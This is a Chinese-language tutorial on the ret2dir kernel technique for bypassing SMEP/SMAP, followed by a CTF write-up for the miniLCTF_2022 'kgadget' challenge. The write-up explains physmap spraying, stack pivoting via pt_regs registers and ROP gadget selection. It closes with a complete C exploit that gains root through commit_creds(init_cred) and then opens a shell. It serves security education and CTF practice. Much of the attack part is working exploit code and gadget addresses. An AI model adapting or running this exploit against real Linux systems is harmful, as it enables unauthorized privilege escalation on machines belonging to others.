## 前言

`ret2dir`是2014年在USENIX发表的一篇论文，该论文提出针对`ret2usr`提出的`SMEP`、`SMAP`等保护的绕过。全称为`return-to-direct-mapped
memory`，返回直接映射的内存。论文地址：<https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-kemerlis.pdf>

## ret2dir

在`SMEP`与`SMAP`等用于隔离用户与内核空间的保护出现时，内核中常用的利用手法是`ret2usr`，如下图所示（图片来自论文）。首先是在内核中找到可以控制指针的漏洞，修改指针使其指向为用户空间，因此在用户空间布置恶意的数据或者代码，完成漏洞的利用。但是当`SMEP`与`SMAP`保护的出现，在内核态下，不能够执行或者访问用户空间的代码或者数据，导致了该利用方式失效，因为即使在用户空间中部署了`payload`，在内核态下也无法访问。因此这种通过显示数据的共享方式已经不再适用了。

![image-20230706112136937](https://image.3001.net/images/20230725/1690267991_64bf71577a3238eeb5b6a.png!small)

所以作者提出了一种思路，能否在内核空间中也能够访问到用户空间的数据。作者最终找到了一段区域，可以隐式的访问用户空间的数据。在内核中存在这部分区域`direct
mapping of all physical memory`，物理地址直接映射区。

![image-20230706114017524](https://image.3001.net/images/20230725/1690267992_64bf7158cf435c47c88cb.png!small)

这个映射区其实就是内核空间会与物理地址空间进行线性的映射，我们可以在这段区域直接访问到物理地址对应的内容。

![未命名文件](https://image.3001.net/images/20230725/1690267993_64bf7159be2510ebdbd00.png!small)

那么作者就提出了一种攻击场景，由于在虚地址中的内容最终都会映射到物理地址上，若能将用户空间的数据同样映射到这段区域上，岂不是就可以在内核空间也可以访问到用户空间的数据了。该段区域也被称之为`phsymap`，它是一段大的，连续的虚拟内存区域，它包含了部分或全部的物理内存的直接映射。下图这种情况作者也称之为是虚拟地址别名的情况，因为在用户空间与内核空间中都存在一个地址可以访问`payload`。

![未命名文件
\(1\)](https://image.3001.net/images/20230725/1690267994_64bf715aba5454fcaa0ba.png!small)

最终作者构想的攻击场景如下图所示（图片来自论文），不同于`ret2usr`，指针不再被修改为指向用户空间，而是指向了物理地址的直接映射区，由于该映射区指向物理地址，而在用户空间构造的`payload`也会映射到物理地址，因此若能获得指向存在`payload`的用户空间对应的物理地址在`phsymap`位置，就能够直接执行用户空间的`payload`。

![image-20230706120102411](https://image.3001.net/images/20230725/1690267996_64bf715c02317d6d8968f.png!small)

想要获得映射地址有以下方法

（1）通过读取`/proc/pid/pagemap`获取，该文件中存放了物理地址与虚拟地址的映射关系，可是该文件需要`root`权限才能读取。

![image-20230707154728342](https://image.3001.net/images/20230725/1690267997_64bf715d476af02f4797d.png!small)

（2）通过大量覆盖`phsymap`内存的方法，提高命中率。使用堆喷技术，在该内存区填充大量的`payload`这样既不会影响`payload`的执行，又能够提高命中`payload`的可能性，填充效果如下图

  

![未命名文件
\(3\)](https://image.3001.net/images/20230725/1690267998_64bf715e933cc924b2793.png!small)

在旧版本的内核中`phsymap`是具有可执行权限的，因此可以在用户空间中填充`shellcode`，但是如今的内核版本`phsymap`已经不具备可执行权限了，因此只能在里面填充`ROP`链

## miniLCTF_2022-kgadget

题目地址：<https://github.com/h0pe-ay/Kernel-Pwn/tree/master/miniLCTF_2022>

## kgadget_ioctl

在`kgadget_ioctl`中，当我们输入的操作码为`0x1BF52`时，会将`rdx`寄存器中的值进行解引用，并且以函数的方式调用该地址，这就导致了任意地址执行。

![image-20230707163020808](https://image.3001.net/images/20230725/1690267999_64bf715f8dc39f631522d.png!small)

## run.sh

题目提供的`run.sh`开启了`smep`与`smap`的保护，但是没有开启地址随机化`KASLR`。因此虽然我们可以控制内核执行任意的地址，但是由于题目开启了`smep`与`smap`，因此该地址值不能选择为用户空间的地址。

    
    
    #!/bin/sh  
    qemu-system-x86_64 \  
    -m 256M \  
    -cpu kvm64,+smep,+smap \  
    -smp cores=2,threads=2 \  
    -kernel bzImage \  
    -initrd ./rootfs.cpio.gz \  
    -nographic \  
    -monitor /dev/null \  
    -snapshot \  
    -append "console=ttyS0 nokaslr pti=on quiet oops=panic panic=1" \  
    -no-reboot \  
    -s

## ret2dir利用流程

首先是如何执行我们指定的地址值的，可以看到实际是将我们传入的地址，解引用后存放到`rbx`寄存器，结果通过将`rbx`寄存器的值移动到栈顶，从而修改栈顶的值，接着调用`ret`指令，使得执行被解引用的值。

![image-20230707165636315](https://image.3001.net/images/20230725/1690268001_64bf71611e2a2efcf3ea5.png!small)

想要使得内核提权，需要执行`commit(prepare_kernel_cred(0)`，接着通过`swapgs`和`ret`指令的组合。因此需要找到一段内存，将该流程的`ROP`链填充进去。这是因为`kgadget_ioctl`并不是执行我们传入进去的地址，而是需要将该地址先解引用后再执行，相当于需要执行传入地址对应的内容。因此若我们直接将`commit`函数的地址传入进去，它会执行`commit`函数指向的内容。

那么这段区域需要选取在哪里，若我们直接再用户空间中构造这段`payload`，接着将用户空间地址传递给`ioctl`是不可行的，因为内核开启了`smap`与`smep`的保护，因此对用户空间的访问都是不被允许的。

因此需要用到`ret2dir`的技巧，由于用户空间的虚拟地址同样会映射到物理地址，而在内核空间存在一段内存被称之为`phsymap`，它存放着物理地址的内容，因此我们在用户空间填充的内容，可以在`phsymap`找到。但是这段内存十分庞大，有64TB的大小，我们怎么才能确保搜索到存放我们`payload`的地址呢？答案就是尽可能的填充，使得我们用户空间的`payload`尽可能的大，那么我们搜索到的几率也会增大。

![image-20230706114017524](https://image.3001.net/images/20230725/1690267992_64bf7158cf435c47c88cb.png!small)

我们以页(`4096`)为单位开辟内存，并且循环了`0x4000`次，

    
    
    void copy_dir()  
    {  
    char *payload;  
    payload = mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);  
    for (int i = 0; i < 4096; i++)  
    payload[i] = 'z';  
    }  
    ...  
    int main()  
    {  
    ...  
    for(int i = 0; i < 0x4000; i++)  
    copy_dir();  
    }

可以发现，在用户空间写入的`z`值，我们在内核空间同样可以访问到。当然写入的次数以及字节数是可以自己人为调整的，可以频繁尝试，尽可能的大的填充，这样我们找到的几率也更大。

![image-20230707171617202](https://image.3001.net/images/20230725/1690268003_64bf7163223ed1089df73.png!small)

当然有时候页的大小页不一定是4096，因此可以使用`getconf PAGESIZE`获得页的大小

![image-20230707171839966](https://image.3001.net/images/20230725/1690268004_64bf71643bcd0a5915f1c.png!small)

因此我们已经找到能够访问到用户空间`payload`的内核地址值，接着需要将内核栈的空间迁移到`phsymap`上，这是因为用原来的内核栈无法使得连续`gadget`之间的调用。这里修改为测试`gadget`，用于测试不做栈迁移会发生什么。

    
    
    unsigned long *payload;  
    payload = mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);  
    payload[0] = 0xffffffff8108c6f0; //pop_rdi;ret;  
    payload[1] = 0xffffffff8108c6f0; //pop_rdi;ret;

可以看到执行一次`pop rdi;
ret`，这是因为`ret`指令会将当前栈顶的值弹出栈，而我们输入的值不再栈上，而是在`phsymap`上。因此当我们输入的`ROP`链不再栈上时，就需要使用栈迁移。

![image-20230707173324894](https://image.3001.net/images/20230725/1690268005_64bf7165746df24de3dbe.png!small)

由于内核中存在着需要改变`rsp`寄存器的`gadget`，只要使用`add rsp, xxx;
ret`即可完成栈迁移。因此需要在栈上填入`phsymap`的地址，使得经过`add rsp,
xxx`后能够使得`rsp`指向`phsymap`。为了使得栈上能够存储`phsymap`的地址，这里需要借助一个结构体`pt_regs`。

    
    
    struct pt_regs {  
    /*  
    * C ABI says these regs are callee-preserved. They aren't saved on kernel entry  
    * unless syscall needs a complete, fully filled "struct pt_regs".  
    */  
    unsigned long r15;  
    unsigned long r14;  
    unsigned long r13;  
    unsigned long r12;  
    unsigned long rbp;  
    unsigned long rbx;  
    /* These regs are callee-clobbered. Always saved on kernel entry. */  
    unsigned long r11;  
    unsigned long r10;  
    unsigned long r9;  
    unsigned long r8;  
    unsigned long rax;  
    unsigned long rcx;  
    unsigned long rdx;  
    unsigned long rsi;  
    unsigned long rdi;  
    /*  
    * On syscall entry, this is syscall#. On CPU exception, this is error code.  
    * On hw interrupt, it's IRQ number:  
    */  
    unsigned long orig_rax;  
    /* Return frame for iretq */  
    unsigned long rip;  
    unsigned long cs;  
    unsigned long eflags;  
    unsigned long rsp;  
    unsigned long ss;  
    /* top of stack page */  
    };

可以看到这个结构体存放了一系列的寄存器，这是因为在进行系统调用时，会完成从用户态到内核态的切换，因此需要保存用户态时的上下文寄存器，而这些寄存器的值都需要保存在`pt_regs`中。使用下述代码测试上述`pt_regs`结构体存放的位置。

    
    
    target =  0xffff888000000000 + 0x6000000;  
    __asm(  
    ".intel_syntax noprefix;"  
    "mov r15, 0x15151515;"  
    "mov r14, 0x14141414;"  
    "mov r13, 0x13131313;"  
    "mov r12, 0x12121212;"  
    "mov r11, 0x11111111;"  
    "mov r10, 0x10101010;"  
    "mov r9,  0x99999999;"  
    "mov r8,  0x88888888;"  
    "mov rax, 0x10;"  
    "mov rcx, 0xcccccccc;"  
    "mov rdx, target;"  
    "mov rsi, 0x1BF52;"  
    "mov rdi, fd;"  
    "syscall;"  
    ".att_syntax;"  
    );

可以看到我们在执行系统调用之前的参数，都会以`pt_regs`结构体中的顺序进行存放，这里需要注意的是`r11`寄存器用来存放了`rflags`的值。

![image-20230708013246949](https://image.3001.net/images/20230725/1690268007_64bf7167cd7abcbf2954b.png!small)

不过出题者在会对`pt_regs`结构体中的部分寄存器的值进行修改。

![image-20230708013612568](https://image.3001.net/images/20230725/1690268009_64bf7169530a7780ba166.png!small)

最后只剩下`r8`与`r9`寄存器是可控的。但是只是用两个寄存器的值就足于完成栈迁移的操作了。

![image-20230708013703427](https://image.3001.net/images/20230725/1690268010_64bf716a7dc1b5eef6753.png!small)

这里可以计算一下栈顶到`r9`寄存器的距离`0xffffc9000021ff98 - 0xffffc9000021fed0 = 0xc8`，因此找到`add
rsp 0xc0`的寄存器即可，因为`ret`指令还会进行一次弹栈操作。这里一开始是使用`extract-image.sh`进行提取，但是会报错。因此改用`vmlinux-to-elf`，这个工具提取出的符号比较全。工具的地址为<https://github.com/marin-m/vmlinux-to-elf>

![image-20230708014733241](https://image.3001.net/images/20230725/1690268011_64bf716baaeef4ae7e177.png!small)

提取出来就可以愉快的获取`gadget`。由于没找到`add 0xc8`的`gadget`，因此找了个平替的。再结合`pop rsp;
ret`指令即可完成栈迁移的操作。

    
    
    add rsp, 0xa8; pop rbx; pop r12; pop rbp; ret;   
    pop rsp; ret;

接着需要考虑堆喷的填充大量内存，因为题目没有开启地址随机化，因此即使不使用堆喷，也能够定位到具体的地址，但是实际情况是该地址可以随机，因此需要确保落入到其他地址也能完成利用。由于第一条指令必须是`add
rsp, 0xa8; pop rbx; pop r12; pop rbp;
ret;`，因为需要进行栈迁移。因此在一页的内存中，因使用尽量多的该指令进行填充，确保栈迁移的正常执行。

由于完成提权的`payload`需要`0x58`的大小，而该指令会将`rsp`抬高`0xc0`，因此用`(4096 - 0x58 - 0xc0) / 8 =
0x1dd`，因此这里循环复制该指令`0x1dd`次，接着将剩余空间使用`ret`指令（常用的堆喷的指令）填充（这里使用了`xor esi , esi;
ret`，因为异或操作不影响。）

    
    
    for (int i = 0; i < 0x1dd; i++)  
    payload[index++] = 0xffffffff81488561; //add rsp, 0xa8; pop rbx; pop r12; pop rbp; ret;   
    for (int i = 0; i < 24; i++)  
    payload[index++] = 0xffffffff81224afc; //xor esi, esi; ret;

最后是在提权时没找到合适`gadget`将`prepare_kernel_cred`的返回值即`rax`寄存器的值，移动到`rdi`寄存器中。因此学了下出题者的`wp`，发现出题者使用了`init_cred`结构体作为`commit_creds`函数的参数。

`init_cred`是 Linux
内核中的一个结构体，用于表示进程的初始凭证。它包含了与进程相关的安全属性和权限信息。，`init_cred`结构体通常用于表示初始的 root
凭证。因此只需要借助一个`pop rdi;ret`的`gadget`加上`init_cred`结构体的地址就可以完成`root`凭证的初始化了。

## exp

最后完整的`exp`如下

    
    
    #include <stdio.h>  
    #include <fcntl.h>  
    #include <sys/mman.h>  
    ​  
    #define COLOR_NONE "\033[0m" //表示清除前面设置的格式  
    #define RED "\033[1;31;40m" //40表示背景色为黑色, 1 表示高亮  
    #define BLUE "\033[1;34;40m"  
    #define GREEN "\033[1;32;40m"  
    #define YELLOW "\033[1;33;40m"  
    ​  
    /*  
    ​  
    0xffffffff81488561: add rsp, 0xa8; pop rbx; pop r12; pop rbp; ret;   
    0xffffffff810c92e0: T commit_creds  
    0xffffffff810c9540: T prepare_kernel_cred  
    0xffffffff81224afc: xor esi, esi; ret;  
    0xffffffff8108c6f0: pop rdi; ret;  
    0xffffffff82a6b700 D init_cred;  
    0xffffffff81c00fb0 T swapgs_restore_regs_and_return_to_usermode  
    0xffffffff811483d0: pop rsp; ret;  
    */  
    int fd;  
    unsigned long user_ss, user_cs, user_sp, user_rflags;     
    unsigned long target;  
    unsigned long target1;  
    ​  
    void save_state();  
    void copy_dir();  
    void back_door();  
    ​  
    void back_door()  
    {  
    printf(RED"getshell");  
    system("/bin/sh");  
    }  
    ​  
    void copy_dir()  
    {  
    ​  
    unsigned long *payload;  
    unsigned int index = 0;  
    payload = mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);                                                                                                                                                                                                                                                                                                                                           
    for (int i = 0; i < 0x1dd; i++)  
    payload[index++] = 0xffffffff81488561; //add rsp, 0xa8; pop rbx; pop r12; pop rbp; ret;   
    for (int i = 0; i < 24; i++)  
    payload[index++] = 0xffffffff81224afc; //xor esi, esi; ret;  
    payload[index++] = 0xffffffff8108c6f0; // pop rdi ret  
    payload[index++] = 0xffffffff82a6b700; //init_cred  
    payload[index++] = 0xffffffff810c92e0; //commit_creds  
    payload[index++] = 0xffffffff81c00fb0 + 0x1b; //swapgs_restore_regs_and_return_to_usermode  
    payload[index++] = 0;  
    payload[index++] = 0;  
    payload[index++] = (unsigned long)back_door;  
    payload[index++] = user_cs;  
    payload[index++] = user_rflags;  
    payload[index++] = user_sp;  
    payload[index++] = user_ss;  
      
    }  
    ​  
    void save_state()  
    {  
    __asm(  
    ".intel_syntax noprefix;"  
    "mov user_ss, ss;"  
    "mov user_cs, cs;"  
    "mov user_sp, rsp;"  
    "pushf;"  
    "pop user_rflags;"  
    ".att_syntax;"  
    );  
    printf(RED"[*]save state\n");  
    printf(BLUE"[+]user_ss:0x%lx\n", user_ss);  
    printf(BLUE"[+]user_cs:0x%lx\n", user_cs);  
    printf(BLUE"[+]user_cs:0x%lx\n", user_sp);  
    printf(BLUE"[+]user_rflags:0x%lx\n", user_rflags);  
    printf(RED"[*]save finish\n");  
    }  
    ​  
    int main()  
    {  
    save_state();     
    fd = open("/dev/kgadget", O_RDWR);  
    /*  
    for(int i = 0; i < 0x4000; i++)  
    copy_dir();  
    */  
      
    target =  0xffff888000000000 + 0x6000000;  
    __asm(  
    ".intel_syntax noprefix;"  
    "mov r15, 0x15151515;"  
    "mov r14, 0x14141414;"  
    "mov r13, 0x13131313;"  
    "mov r12, 0x12121212;"  
    "mov r11, 0x11111111;"  
    "mov r10, 0x10101010;"  
    "mov r9,  0xffffffff811483d0;"  
    "mov r8,  target;"  
    "mov rax, 0x10;"  
    "mov rcx, 0xcccccccc;"  
    "mov rdx, target;"  
    "mov rsi, 0x1BF52;"  
    "mov rdi, fd;"  
    "syscall;"  
    ".att_syntax;"  
    );  
      
    }

 **更多网安技能的在线实操练习，[请点击这里>>﻿](https://www.hetianlab.com/)**

  

